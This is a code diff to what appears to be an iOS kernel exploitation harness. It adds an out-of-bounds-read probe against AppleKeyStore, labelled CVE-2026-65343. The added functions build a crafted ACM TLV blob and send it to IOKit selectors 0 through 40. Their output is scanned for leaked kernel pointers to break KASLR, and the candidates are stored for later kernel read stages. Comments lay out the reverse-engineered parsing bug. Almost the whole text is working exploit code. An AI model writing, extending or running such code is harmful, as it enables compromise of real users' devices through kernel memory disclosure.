@@ -34,7 +34,7 @@
 #import <string.h>
 #import <mach/mach.h>
 
-#define P057_BUILD @"aks-p007-v6-async-hook"
+#define P057_BUILD @"aks-p007-v7-acm-tlv"
 #define SE_KEY_TAG "com.research.p007.aks.v5"
 #define OUTBUF_SZ  0x400u
 #define FILL_BYTE  0xBBu
@@ -421,6 +421,76 @@ static int p057_probe(io_connect_t conn, const uint8_t *handle16,
     return found;
 }
 
+/* v7 (Ghidra 23F77 decode of the LibSerialization.c chain):
+   AppleKeyStoreCommand action (FUN_008d72c78, mdin/mdout) -> TLV walk
+   (FUN_008d67874) -> case tag 0x33 -> ACMDeserializeSEPControlCode(blob+8,
+   len-8, &out) -> FUN_008d5c7d0 -> deserializeParameters (FUN_008d5628c):
+   ACM wire = [0x00..0x0F header, UNCHECKED][+0x10 u32 n_params, must be 0..0xa]
+   [per param: u32 type | u32 len | len bytes, all bounds-checked].
+   The bug: after a FULLY consumed param list the wrapper reads u32 at the
+   FINAL offset with NO end check (FUN_008d5c7d0 *param_7 = *puVar1) and feeds
+   it to the version gate — a 1-bit oracle on the first bytes AFTER our
+   kernel-backed input buffer (KASLR, per the PoC). Fill the param so parsing
+   ends exactly at the input end: 0x10 + 4(count) + 8(param hdr) + L = size.
+   Bytes[4]=0x33 satisfies the walker tag too — one blob covers both shapes.
+   Sweep: ONE call per selector 0..40. No 0x800, no 163, no size sweep. */
+static void p057_build_acm(uint8_t *buf, uint32_t buflen, uint32_t paramLen) {
+    memset(buf, 0, buflen);
+    buf[4] = 0x33;                       /* walker tag 0x33 */
+    uint32_t count = 1;
+    uint32_t type = 1;
+    memcpy(buf + 0x10, &count, 4);
+    memcpy(buf + 0x14, &type, 4);
+    memcpy(buf + 0x18, &paramLen, 4);
+    memset(buf + 0x1c, 0x11, paramLen);
+}
+
+static int p057_probe_acm(io_connect_t conn, int sel) {
+    if (sel < 0 || sel > 0x40) return 0;
+    uint8_t blob[0x28];                  /* 0x10 + 4 + 8 + 12 = 0x28 */
+    p057_build_acm(blob, (uint32_t)sizeof(blob), 12);
+    uint8_t outbuf[OUTBUF_SZ];
+    memset(outbuf, FILL_BYTE, sizeof(outbuf));
+    size_t outsz = sizeof(outbuf);
+    uint64_t scalo[8] = {0};
+    uint32_t scaln = 8;
+
+    kern_return_t kr = real_IOConnectCallMethod(
+        conn, (uint32_t)sel, NULL, 0, blob, sizeof(blob),
+        scalo, &scaln, outbuf, &outsz);
+
+    int nonfill = 0;
+    for (size_t i = 0; i < sizeof(outbuf); i++)
+        if (outbuf[i] != FILL_BYTE) nonfill++;
+
+    p057_log(@"  acm sel=%2d insz=0x28 kr=0x%08x (%s) outsz=%zu nonfill=%d scaln=%u sc0=0x%llx",
+             sel, kr, p057_krn(kr), outsz, nonfill, scaln, scaln ? scalo[0] : 0ULL);
+
+    size_t hexn = outsz;
+    if (hexn > 64) hexn = 64;
+    if (hexn > sizeof(outbuf)) hexn = sizeof(outbuf);
+    if (nonfill > 0) {
+        NSMutableString *hex = [NSMutableString string];
+        for (size_t i = 0; i < hexn; i++)
+            [hex appendFormat:@"%02x", outbuf[i]];
+        p057_log(@"    hex[%zu]: %@", hexn, hex);
+    }
+
+    int found = 0;
+    size_t scan = outsz < sizeof(outbuf) ? outsz : sizeof(outbuf);
+    for (size_t i = 0; i + 8 <= scan; i += 8) {
+        uint64_t v = 0;
+        memcpy(&v, outbuf + i, 8);
+        if (!p057_looks_kptr(v)) continue;
+        found++;
+        p057_log(@"  *** KPTR acm sel=%d @+0x%04zx = 0x%016llx ***",
+                 sel, i, (unsigned long long)v);
+        p057_log(@"      KASLR candidate only. Not hasKread. Not commitSlide.");
+        [[P007Board shared] recordCandidate:v kind:@"kaslr" source:@"p057"];
+    }
+    return found;
+}
+
 @implementation P057AksDeserialize
 
 + (NSString *)tap {
@@ -434,8 +504,9 @@ static int p057_probe(io_connect_t conn, const uint8_t *handle16,
     p057_log(@"CVE-2026-65343 AKS ACM deserialize OOB read. KASLR, not KRW, not kreadbuf.");
     p057_log(@"Fixed 26.6.1 → LIVE on 23F77 / 23G71.");
     p057_log(@"Ghidra: LibSer_ACMDeserializeSEPControlCode @ fffffff008d5cc80 (ACM min 0x18).");
-    p057_log(@"v4 already sent declared=0x800 +24 insz=28 on sel0-7 zero-handle; kptrs=0.");
-    p057_log(@"This TAP: hook self-test + sel0/1 hex + decl 0x28 then 0x100. No 163. No sel5. No 0x800.");
+    p057_log(@"v6 decode: deserializeParameters wire = [hdr 0x10 unchecked][count u32][type|len|data]*;");
+    p057_log(@"wrapper reads u32 at FINAL offset with NO end check = OOB into adjacent kernel bytes");
+    p057_log(@"feeding the version/entitlement gate (1-bit KASLR oracle). Sweep: v7 ACM envelope.");
     p057_log(@"");
 
     NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p057"];
@@ -555,9 +626,19 @@ static int p057_probe(io_connect_t conn, const uint8_t *handle16,
         p057_log(@"NEXT: paste hex; 0x800 on THIS selector only after you authorize.");
     } else {
         p057_log(@"No kptrs on sel0/1 at decl<=0x100. Matches v4 empty kr=0.");
-        p057_log(@"sel0/1 accepting our 28-byte shape is not proof they are deserialize.");
-        p057_log(@"Need ACM created on THIS AppleKeyStore conn, then deserialize.");
-        p057_log(@"Do not size-sweep sel5 (2c1 privilege). Do not 163-sel. Do not 0x800.");
+        p057_log(@"[4] v7 ACM TLV envelope sweep (Ghidra-decoded wire format). ONE call");
+        p057_log(@"    per selector 0..40, insz=0x28, tag 0x33, parse-ends-at-end OOB shape.");
+        p057_log(@"    Baseline from v4 census: sel0/1 kr=0 empty; sel2-4/6-7 0xe00002c2;");
+        p057_log(@"    sel5 0xe00002c1. ANY OTHER kr or nonfill on this shape = door candidate.");
+        int acmKptr = 0;
+        for (int sel = 0; sel <= 40; sel++) {
+            acmKptr += p057_probe_acm(conn, sel);
+        }
+        p057_log(@"[4] done acm_kptrs=%d (single call per sel; no 0x800, no 163, no sweep-sizes).", acmKptr);
+        if (acmKptr > 0) {
+            p057_log(@"*** copyout produced kernel-range qwords from the ACM OOB. KASLR sibling of aio84530.");
+            p057_log(@"*** NOT hasKread. commitSlide needs kread32(kbase)==MH_MAGIC_64.");
+        }
     }
 
     for (uint32_t i = 0; i < nopened; i++) {
